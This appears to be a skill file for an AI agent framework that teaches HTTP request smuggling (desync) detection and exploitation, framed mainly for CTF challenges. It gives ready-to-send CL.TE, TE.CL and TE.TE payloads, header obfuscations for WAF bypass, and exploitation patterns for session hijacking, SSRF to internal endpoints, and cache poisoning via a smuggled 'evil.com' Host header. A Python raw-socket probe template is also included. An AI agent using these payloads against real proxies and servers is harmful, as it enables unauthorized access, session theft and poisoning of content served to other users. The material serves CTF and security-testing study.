---
name: http-request-smuggling
description: HTTP Request Smuggling (HRS) / Desync attack detection and exploitation. Covers CL.TE, TE.CL, TE.TE detection, payload crafting, and chaining with SSRF/cache poisoning. Use when front-end/back-end architecture is suspected or when HTTP parsing discrepancies exist.
metadata:
  hermes:
    category: web-security
    tags: [http, desync, smuggling, cache-poisoning, ssrf, ctf]
platforms: [linux, macos, windows]
---

# HTTP Request Smuggling (Desync) Skill

## When to Use

Activate this skill when:
- The target has a reverse proxy / load balancer / CDN in front of the app server
- You observe inconsistent behavior between direct and proxied requests
- CTF challenge hints at "front-end/back-end disagreement" or "HTTP parsing quirks"
- You want to bypass WAFs, poison caches, or smuggle requests to internal APIs

---

## Core Concepts

HTTP Request Smuggling exploits **disagreements** between front-end (proxy/WAF) and back-end (app server) about where one request ends and the next begins.

### Three Classic Variants

| Variant | Front-end sees | Back-end sees | Trigger condition |
|---------|---------------|---------------|-------------------|
| **CL.TE** | `Content-Length` | `Transfer-Encoding` | Front-end uses CL; back-end uses TE |
| **TE.CL** | `Transfer-Encoding` | `Content-Length` | Front-end uses TE; back-end uses CL |
| **TE.TE** | `Transfer-Encoding` | `Transfer-Encoding` | Both use TE, but parse differently (obfuscated TE header) |

### Detection Payloads

**CL.TE Detection:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Length: 15

x=1
0

```

**TE.CL Detection:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

**TE.TE Detection (obfuscated header):**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: xchunked
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Length: 15

x=1
0

```

Valid obfuscations for TE.TE:
- `Transfer-Encoding: chunke\xd` (byte-smuggling)
- `Transfer-Encoding: chunked\x00` (null-prefix)
- `Transfer-Encoding:  chunked` (leading space)
- `Transfer-Encoding:\tchunked` (tab instead of space)
- `Transfer-Encoding: Chunked` (case variation, depends on server)

---

## Detection Methodology

### Step 1: Architecture Reconnaissance
Identify if a reverse proxy / CDN exists:
- Check response headers for: `Via`, `X-Cache`, `X-Forwarded-For`, `CF-RAY`, `Fastly-Debug`
- Check if `TRACE` or `OPTIONS` responses reveal proxy chain
- Send malformed requests and observe if errors come from proxy or app server

### Step 2: Differential Response Testing
Send the detection payloads above. A **time-delay** or **differential response** indicates desync:
- **Time-delay**: Second request is delayed because back-end is waiting for the smuggled request body
- **Differential response**: Normal GET returns 200; after smuggling payload, GET returns 404 or 500

### Step 3: Confirm with Back-end Poisoning
Once a delay is observed, confirm by "poisoning" the back-end connection:
1. Send smuggling payload that prepends an internal request
2. Immediately follow with a benign request on the same connection
3. If the benign request receives the response intended for the smuggled request → confirmed

---

## Exploitation Patterns

### Pattern 1: Credential Hijacking (Session Poisoning)
Smuggle a request that captures the next user's session cookie:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 250
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
X-Ignore: X
```
The back-end sees the smuggled `GET /admin` followed by the next legitimate request, potentially associating the admin response with the victim's session.

### Pattern 2: Access Internal APIs (SSRF Amplification)
```http
POST /api/forward HTTP/1.1
Host: target.com
Content-Length: 60
Transfer-Encoding: chunked

0

GET http://127.0.0.1:8080/internal/flag HTTP/1.1
X-Foo: x
```

### Pattern 3: Cache Poisoning
Smuggle a request that causes the back-end to cache a malicious response:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 80
Transfer-Encoding: chunked

0

GET /static/app.js HTTP/1.1
Host: evil.com
X-Foo: X
```
If the cache keys on the URL but the back-end uses the `Host` header from the smuggled request, subsequent users may load content from `evil.com`.

---

## CTF-Specific Shortcuts

### Quick Win Checklist
1. **Check for proxy indicators** in every response header
2. **Test CL.TE first** — it's the most common in CTF environments
3. **If TE header is stripped by WAF**, try TE.CL (front-end sees TE, strips it; back-end falls back to CL)
4. **Smuggle to internal endpoints** — CTFs often hide `/admin`, `/flag`, `/internal` behind the proxy
5. **Look for H2.CL or H2.TE** — HTTP/2 to HTTP/1.1 downgrade is a common CTF variant

### HTTP/2 Downgrade (H2.TE / H2.CL)
In HTTP/2→HTTP/1.1 downgrade scenarios:
- HTTP/2 pseudo-headers (`:authority`, `:path`) become HTTP/1.1 headers
- Inject `content-length` or `transfer-encoding` via HTTP/2 header injection
- Use tools like `h2c-smuggler` or manually craft HTTP/2 frames

### Common CTF Proxy Combinations
| Front-end | Back-end | Likely Variant | Test Priority |
|-----------|----------|----------------|---------------|
| Nginx | Apache/PHP | CL.TE | 1 |
| Nginx | Gunicorn | TE.CL | 2 |
| Cloudflare | Any | TE.TE (obfuscation) | 3 |
| AWS ALB | Any | H2.CL | 4 |

---

## Tool Recommendations

### Automated Detection
- **`python_exec` with `requests`** — Write custom desync probes; CTFs rarely have `httpx-smuggler` pre-installed
- **`smuggler`** (if available): `python smuggler.py -u http://target`
- **`http-request-smuggler`** (Burp extension) — not available in CLI, use Python scripts instead

### Manual Python Probe Template
```python
import socket, ssl

def desync_probe(host, port, payload, use_ssl=False):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if use_ssl:
        sock = ssl.wrap_socket(sock)
    sock.connect((host, port))
    sock.send(payload.encode())
    # Read both responses
    data = b""
    sock.settimeout(5)
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data.decode(errors="ignore")
```

---

## Pitfalls

- **Connection reuse timing**: Desync requires the same TCP connection. Ensure `Connection: keep-alive` and no premature socket closure.
- **Chunked encoding syntax**: Each chunk MUST end with `\r\n`. `0\r\n\r\n` terminates the body. A single `\n` instead of `\r\n` will fail silently.
- **Content-Length miscalculation**: The front-end CL must be calculated so the smuggled request starts exactly at the boundary. Off-by-one = no desync.
- **WAF interference**: Some WAFs normalize `Transfer-Encoding` headers. If detection fails, try header obfuscation (see TE.TE section).
- **False positives from time delays**: Network jitter can cause false positives. Always confirm with differential response or back-end poisoning.

## Verification Checklist

- [ ] Identified front-end / back-end architecture
- [ ] Observed time delay or differential response with detection payload
- [ ] Confirmed with back-end poisoning test
- [ ] Successfully smuggled a complete HTTP request
- [ ] Extracted flag / accessed unauthorized endpoint via smuggled request
